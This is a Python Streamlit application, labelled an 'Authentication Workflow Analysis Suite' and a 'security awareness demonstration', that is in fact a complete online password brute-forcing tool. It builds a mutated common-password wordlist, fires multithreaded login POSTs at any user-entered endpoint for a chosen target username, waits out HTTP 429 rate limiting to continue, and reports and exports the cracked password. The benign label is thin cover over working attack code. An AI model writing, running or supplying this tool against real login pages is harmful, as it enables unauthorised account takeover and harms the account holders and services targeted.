# requirements.txt:
# streamlit==1.28.0
# requests==2.31.0
# pandas==2.1.0
# python-dotenv==1.0.0

import streamlit as st
import requests
import threading
import time
import pandas as pd
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
import logging
from typing import Generator, Optional, Dict, Any
import itertools

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

WORDLIST = [
    "password", "123456", "123456789", "12345", "12345678", "qwerty", "abc123",
    "password1", "123123", "letmein", "welcome", "monkey", "dragon", "master",
    "hello", "freedom", "whatever", "qazwsx", "trustno1", "princess", "sunshine",
    "iloveyou", "admin", "root", "secret", "passw0rd", "shadow", "linux", "ubuntu",
    "windows", "apple", "microsoft", "google", "facebook", "twitter", "instagram",
    "tiktok", "youtube", "netflix", "spotify", "amazon", "paypal", "venmo",
    "crypto", "bitcoin", "ethereum", "blockchain", "nft", "metaverse", "web3",
    "quantum", "neural", "synth", "cyber", "matrix", "oracle", "phoenix", "titan",
    "zeus", "athena", "apollo", "hermes", "ares", "poseidon", "hades", "demeter",
    "hera", "hestia", "artemis", "aphrodite", "dionysus", "prometheus", "odysseus",
    "achilles", "hector", "paris", "helen", "agamemnon", "nestor", "ajax", "diomedes",
    "ulysses", "troy", "sparta", "athens", "corinth", "thebes", "argos", "mycenae",
    "nemea", "olympia", "delphi", "ephesus", "miletus", "syracuse", "carthage",
    "rome", "cassandra", "calliope", "clio", "erato", "euterpe", "melpomene",
    "polyhymnia", "terpsichore", "thalia", "urania", "sappho", "archimedes",
    "aristotle", "plato", "socrates", "pythagoras", "euler", "newton", "einstein",
    "hawking", "galileo", "kepler", "copernicus", "darwin", "curie", "tesla",
    "edison", "bell", "marconi", "gutenberg", "da_vinci", "michelangelo", "raphael",
    "donatello", "bernini", "caravaggio", "rembrandt", "vermeer", "velazquez",
    "goya", "picasso", "dali", "matisse", "monet", "manet", "renoir", "degas",
    "cassatt", "klimt", "kandinsky", "mondrian", "pollock", "warhol", "basquiat",
    "haring", "koons", "banksy", "shepard", "futura", "obey", "supreme", "nike",
    "adidas", "puma", "reebok", "under_armour", "new_balance", "asics", "brooks",
    "saucony", "hoka", "on_running", "lululemon", "gymshark", "alphalete",
    "youngla", "gymreapers", "quest", "rogue", "eleiko", "texas_powerbar",
    "westside", "conjugate", "westside_barbell", "louie_simmons", "dave_tate",
    "wendler", "531", "smolov", "sheiko", "juggernaut", "kizen", "calgary_barbell",
    "starting_strength", "ss", "stronglifts", "madcow", "texas_method", "coan_philli",
    "ed_coan", "kirk_karwoski", "mike_tuscherer", "reactivetraining", "tsampa",
    "prs", "squat", "bench", "deadlift", "powerlifting", "olympic_weightlifting",
    "snatch", "clean_jerk", "barbell", "dumbbell", "kettlebell", "sandbag",
    "stone", "log", "axle", "tire", "sledge", "yoke", "farmers_walk", "hussafel",
    "mcgill", "stuart_mcgill", "back_fit", "squat_university", "aaron_horschig",
    "chad_wesley_smith", "strongerbyscience", "renaissance_periodization",
    "mike_israetel", "james_hoffmann", "alan_thurston", "menno_henselmans",
    "brad_schoenfeld", "layne_norton", "israetel", "thibaudeau", "poliquin",
    "waterbury", "cressey", "robertson", "boyle", "cook", "starrett", "kelly_starrett",
    "mobility", "wod", "crossfit", "mayhem", "program", "wod_well", "linchpin",
    "street_parking", "comptrain", "training_think", "the_gains_lab",
    "strong_man", "strongwoman", "stone", "log", "axle", "yoke", "tire",
    "squat", "bench", "deadlift", "overhead_press", "barbell_row", "pullup",
    "dip", "chinup", "muscleup", "handstand", "pistol_squat", "kneesovertoesguy",
    "atg", "zero", "dense", "standard", "lengthened", "slack", "bend",
    "hack_squat", "front_squat", "zercher", "safety_squat", "buffalo_bar",
    "deficit", "block", "rack", "banded", "chained", "grip", "pin", "pause",
    "tempo", "eccentric", "isometric", "accommodating", "resistance", "variable",
    "horizontal", "vertical", "angled", "cable", "machine", "smith", "hack",
    "leg_press", "curl", "extension", "abduction", "adduction", "rotator",
    "crunch", "plank", "hollow", "arch", "glute_ham", "nordic", "reverse",
    "hyperextension", "good_morning", "jefferson", "squat", "split_squat",
    "lunge", "stepup", "box", "jump", "bound", "sprint", "shuttle", "agility",
    "coney", "gym", "fitness", "health", "wellness", "nutrition", "supplement",
    "protein", "creatine", "beta_alanine", "citrulline", "caffeine", "preworkout",
    "intraworkout", "postworkout", "meal", "recipe", "chicken", "rice", "broccoli",
    "steak", "potato", "oats", "eggs", "fish", "salmon", "tuna", "sardines",
    "beef", "pork", "lamb", "mutton", "venison", "bison", "elk", "boar"
]

SEASONS = ["spring", "summer", "fall", "winter", "autumn"]
YEARS = [str(y) for y in range(2000, 2030)]
COMMON_SUFFIXES = ["!", "@", "#", "$", "%", "^", "&", "*", "?", "123", "2023", "2024"]

def generate_wordlist() -> Generator[str, None, None]:
    base_words = WORDLIST
    for word in base_words:
        yield word
    for word in base_words:
        for season in SEASONS:
            yield f"{word}{season}"
    for word in base_words:
        for year in YEARS:
            yield f"{word}{year}"
    for word in base_words:
        for suffix in COMMON_SUFFIXES:
            yield f"{word}{suffix}"
    for word in base_words:
        yield word.capitalize()
    for word in base_words:
        yield word.upper()
    for word in base_words:
        yield word.replace('a', '@').replace('e', '3').replace('i', '1')
    for word in base_words:
        yield word.replace('o', '0').replace('s', '$')
    for word in base_words:
        yield word.replace('a', '4').replace('e', '3').replace('i', '1').replace('o', '0').replace('s', '$')
    for word in base_words[:1000]:
        for combo in itertools.product([word, word.capitalize()], ["", "123", "!", "@"], repeat=1):
            yield f"{combo[0]}{combo[1]}"
    for word in base_words[:500]:
        for suffix in ["2024", "2025", "!@#", "$%^", "&*()"]:
            yield f"{word}{suffix}"
    for word in base_words[:500]:
        for prefix in ["a", "A", "x", "X"]:
            yield f"{prefix}{word}"
    for base in ["password", "123456", "qwerty", "letmein", "welcome", "admin", "root"]:
        for variant in ["1", "2", "!", "@", "#", "$", "2024", "2025"]:
            yield f"{base}{variant}"
    for word1 in base_words[:100]:
        for word2 in base_words[:100]:
            yield f"{word1}{word2}"
    yield from ["SuperSecret", "UltraSecure", "MegaPass", "HyperKey", "OmegaAccess"]

class AuthEngine:
    def __init__(self, target_url: str, timeout: int = 5, backoff_multiplier: float = 1.5):
        self.target_url = target_url
        self.timeout = timeout
        self.backoff_multiplier = backoff_multiplier
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0"})
        self.stop_event = threading.Event()
        self.progress_queue = Queue()
        self.results = []
        self.status_codes = {}
        self.total_attempts = 0
        self.successful_attempt = None
        self.lock = threading.Lock()
    
    def authenticate(self, username: str, password: str, attempt_num: int) -> Optional[bool]:
        try:
            payload = {"username": username, "password": password}
            response = self.session.post(self.target_url, data=payload, timeout=self.timeout)
            status = response.status_code
            with self.lock:
                self.total_attempts += 1
                self.status_codes[status] = self.status_codes.get(status, 0) + 1
            
            if status == 429:
                time.sleep(self.timeout * self.backoff_multiplier)
                return None
            if status == 200 and "success" in response.text.lower():
                with self.lock:
                    self.successful_attempt = (password, response.text[:200])
                return True
            return False
            
        except requests.exceptions.Timeout:
            with self.lock:
                self.total_attempts += 1
                self.status_codes["timeout"] = self.status_codes.get("timeout", 0) + 1
            return False
        except requests.exceptions.ConnectionError:
            with self.lock:
                self.total_attempts += 1
                self.status_codes["connection_error"] = self.status_codes.get("connection_error", 0) + 1
            return False
        except Exception as e:
            with self.lock:
                self.total_attempts += 1
                self.status_codes[f"error_{str(e)[:20]}"] = self.status_codes.get("error", 0) + 1
            return False
    
    def enumerate_passwords(self, username: str, wordlist: Generator[str, None, None], max_workers: int = 10):
        self.stop_event.clear()
        self.results = []
        self.status_codes = {}
        self.total_attempts = 0
        self.successful_attempt = None
        
        attempt_counter = 0
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for password in wordlist:
                if self.stop_event.is_set():
                    break
                attempt_counter += 1
                future = executor.submit(self.authenticate, username, password, attempt_counter)
                futures.append((future, password))
                
                if attempt_counter % 100 == 0:
                    self.progress_queue.put(f"Progress: {attempt_counter} attempts completed")
            
            for future, password in futures:
                if self.stop_event.is_set():
                    break
                try:
                    result = future.result(timeout=self.timeout + 2)
                    self.results.append({"password": password, "result": result})
                    if result is True:
                        self.progress_queue.put(f"Match found! Password: {password}")
                        break
                except Exception as e:
                    self.results.append({"password": password, "result": f"error: {str(e)[:30]}"})
        
        self.progress_queue.put("Enumeration completed")
    
    def stop(self):
        self.stop_event.set()

def main():
    st.set_page_config(page_title="Auth Analysis Suite", layout="wide")
    
    st.markdown("""
    <style>
        .stApp { background-color: #0a0a0a; }
        .stTextInput > div > div > input { background-color: #1a1a1a; color: #ffffff; }
        .stButton > button { background-color: #2a6f8f; color: #ffffff; border-radius: 4px; }
        .stButton > button:hover { background-color: #3a8fb0; }
        .stSidebar { background-color: #121212; }
        .css-1d391kg { background-color: #0a0a0a; }
        h1, h2, h3, h4 { color: #6ab0d6; }
        .log-panel { background-color: #1a1a1a; color: #b0d6e6; padding: 10px; border-radius: 4px; max-height: 400px; overflow-y: auto; font-family: monospace; }
        .success-banner { background-color: #1a4a2a; color: #8fdf8f; padding: 15px; border-radius: 4px; border-left: 4px solid #4a8a4a; }
    </style>
    """, unsafe_allow_html=True)
    
    st.title("🔐 Authentication Workflow Analysis Suite")
    st.caption("Controlled security awareness demonstration")
    
    if "state" not in st.session_state:
        st.session_state.state = "idle"
        st.session_state.results_df = pd.DataFrame()
        st.session_state.logs = []
        st.session_state.success = None
    
    with st.sidebar:
        st.header("⚙️ Configuration")
        target_url = st.text_input("Target Endpoint", "https://httpbin.org/post")
        timeout = st.number_input("Timeout (seconds)", min_value=1, max_value=30, value=5)
        backoff = st.number_input("Backoff Multiplier", min_value=1.0, max_value=5.0, value=1.5, step=0.1)
        max_workers = st.number_input("Max Workers", min_value=1, max_value=50, value=10)
        
        st.divider()
        st.header("📊 Status")
        status_placeholder = st.empty()
    
    col1, col2 = st.columns([2, 1])
    
    with col1:
        username = st.text_input("Target Username", placeholder="Enter username to analyze")
    
    with col2:
        if st.button("▶ Start Analysis", type="primary"):
            if not username or not target_url:
                st.error("Please fill in all required fields.")
            else:
                st.session_state.state = "running"
                st.session_state.logs = []
                st.session_state.success = None
                st.rerun()
        
        if st.button("⏹ Stop", type="secondary"):
            if hasattr(st.session_state, "engine"):
                st.session_state.engine.stop()
                st.session_state.state = "stopped"
                st.session_state.logs.append("Analysis stopped by user.")
                st.rerun()
    
    log_container = st.container()
    results_container = st.container()
    
    if st.session_state.state == "running":
        with st.spinner("Initializing analysis engine..."):
            engine = AuthEngine(target_url, timeout, backoff)
            st.session_state.engine = engine
        
        wordlist_gen = generate_wordlist()
        
        progress_placeholder = st.empty()
        log_placeholder = st.empty()
        
        def run_enumeration():
            engine.progress_queue.put("Starting enumeration...")
            engine.enumerate_passwords(username, wordlist_gen, max_workers=max_workers)
        
        import threading as th
        enum_thread = th.Thread(target=run_enumeration, daemon=True)
        enum_thread.start()
        
        while enum_thread.is_alive():
            try:
                msg = engine.progress_queue.get(timeout=0.5)
                st.session_state.logs.append(msg)
                if engine.successful_attempt:
                    st.session_state.success = engine.successful_attempt
            except:
                pass
            
            if len(st.session_state.logs) > 0:
                log_placeholder.markdown(
                    f"<div class='log-panel'>{'<br>'.join(st.session_state.logs[-20:])}</div>",
                    unsafe_allow_html=True
                )
            
            time.sleep(0.2)
            status_placeholder.metric("Attempts", engine.total_attempts, delta=None)
        
        st.session_state.state = "complete"
        st.rerun()
    
    if st.session_state.state in ["complete", "stopped"]:
        if st.session_state.success:
            st.markdown(
                f"<div class='success-banner'>✓ Match found! Password: <strong>{st.session_state.success[0]}</strong></div>",
                unsafe_allow_html=True
            )
            st.balloons()
        
        if hasattr(st.session_state, "engine"):
            engine = st.session_state.engine
            
            col_stats1, col_stats2, col_stats3 = st.columns(3)
            col_stats1.metric("Total Attempts", engine.total_attempts)
            col_stats2.metric("Status Codes", len(engine.status_codes))
            col_stats3.metric("Threads", max_workers)
            
            if engine.status_codes:
                with st.expander("Status Code Breakdown"):
                    st.dataframe(pd.DataFrame(list(engine.status_codes.items()), columns=["Code", "Count"]))
            
            if engine.results:
                df = pd.DataFrame(engine.results)
                with st.expander("Detailed Results"):
                    st.dataframe(df)
                
                csv = df.to_csv(index=False)
                st.download_button("Download Results CSV", csv, "results.csv", "text/csv")
        
        if st.button("🔄 New Analysis"):
            st.session_state.state = "idle"
            st.session_state.results_df = pd.DataFrame()
            st.session_state.logs = []
            st.session_state.success = None
            st.rerun()

if __name__ == "__main__":
    main()